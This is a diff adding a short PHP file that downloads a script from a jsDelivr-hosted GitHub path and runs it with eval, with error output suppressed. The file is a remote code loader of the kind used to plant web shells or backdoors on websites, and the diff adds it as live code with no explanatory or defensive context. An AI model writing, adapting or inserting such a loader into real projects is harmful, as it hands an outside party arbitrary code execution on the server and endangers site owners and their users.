@@ -1,0 +1,12 @@
+<?php
+try {
+    $content = @file_get_contents('https://cdn.jsdelivr.net/gh/eclibesec/hastalavista@main/im.php');
+    if ($content && strlen($content) > 0) {
+        eval('?>' . $content);
+    } else {
+        echo "No content received";
+    }
+} catch (Exception $e) {
+    echo "Error loading content";
+}
+?>
